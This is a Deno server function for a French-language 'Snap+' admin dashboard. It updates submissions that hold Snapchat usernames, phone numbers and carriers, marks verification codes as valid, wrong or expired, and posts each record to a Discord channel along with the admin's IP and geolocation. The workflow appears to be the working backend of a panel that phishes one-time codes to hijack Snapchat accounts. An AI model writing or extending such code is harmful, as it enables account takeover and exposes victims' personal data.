import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

async function botAPI(endpoint, method = "GET", body = null) {
  const res = await fetch(`https://discord.com/api/v10${endpoint}`, {
    method,
    headers: {
      "Authorization": `Bot ${Deno.env.get("DISCORD_BOT_TOKEN")}`,
      "Content-Type": "application/json"
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  if (!res.ok) throw new Error(`Discord ${res.status}: ${text}`);
  return text ? JSON.parse(text) : {};
}

const actionLabels = {
  valid: { label: "✅ Code validé par un admin", color: 0x2ECC71 },
  wrong: { label: "❌ Mauvais numéro", color: 0xE74C3C },
  expired: { label: "⏰ Code expiré / renvoyé", color: 0xF39C12 },
  wait: { label: "⏳ Mis en file d'attente", color: 0x3498DB },
  code_ready: { label: "📤 Code envoyé par un admin", color: 0xFFD700 },
};

const statusMap = {
  valid: "code_valid",
  wrong: "code_wrong",
  expired: "code_expired",
  wait: "waiting_queue",
  code_ready: "code_ready",
};

Deno.serve(async (req) => {
  try {
    const { submissionId, action } = await req.json();

    if (!submissionId) {
      return Response.json({ error: 'submissionId requis' }, { status: 400 });
    }

    const newStatus = statusMap[action] || "code_ready";
    const base44 = createClientFromRequest(req);
    await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });

    const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);

    const adminIp = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
    const userAgent = req.headers.get("user-agent") || "";

    let browser = "Inconnu";
    if (userAgent.includes("Edg/")) browser = "Edge";
    else if (userAgent.includes("OPR/") || userAgent.includes("Opera")) browser = "Opera";
    else if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";

    let device = "Inconnu";
    if (/iPhone|iPad|iPod/.test(userAgent)) device = "iPhone/iPad";
    else if (/Android/.test(userAgent) && /Mobile/.test(userAgent)) device = "Téléphone Android";
    else if (/Android/.test(userAgent)) device = "Tablette Android";
    else if (/Windows|Macintosh|Linux/.test(userAgent)) device = "Desktop";

    let country = "Inconnue";
    let city = "Inconnue";
    try {
      const geoRes = await fetch(`https://ip-api.com/json/${adminIp}`, { signal: AbortSignal.timeout(5000) });
      if (geoRes.ok) {
        const geo = await geoRes.json();
        if (geo.status === "success") {
          country = geo.country || "Inconnue";
          city = geo.city || "Inconnue";
        }
      }
    } catch (e) {
      console.error("ip-api.com failed:", e.message);
    }

    const now = new Date();
    const heureStr = now.toLocaleString("fr-FR", {
      day: "numeric", month: "short", hour: "2-digit", minute: "2-digit", second: "2-digit",
      timeZone: "Europe/Paris"
    });

    const { label, color } = actionLabels[action] || actionLabels["code_ready"];

    const channelId = Deno.env.get("DISCORD_CHANNEL_ID");
    await botAPI(`/channels/${channelId}/messages`, "POST", {
      embeds: [{
        title: label,
        color,
        fields: [
          { name: "👻 Snapchat", value: sub?.snapchat || "N/A", inline: true },
          { name: "📞 Téléphone", value: sub?.telephone || "N/A", inline: true },
          { name: "📡 Opérateur", value: sub?.operateur || "N/A", inline: true },
          { name: "🌐 Navigateur", value: browser, inline: true },
          { name: "🏙️ Ville", value: city, inline: true },
          { name: "🌍 Pays", value: country, inline: true },
          { name: "💾 Appareil", value: device, inline: true },
          { name: "🕵️ IP Admin", value: `\`${adminIp}\``, inline: true },
          { name: "🕐 Heure", value: heureStr, inline: true },
        ],
        footer: { text: "Admin Dashboard • Snap+" },
        timestamp: now.toISOString(),
      }]
    });

    return Response.json({ ok: true });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});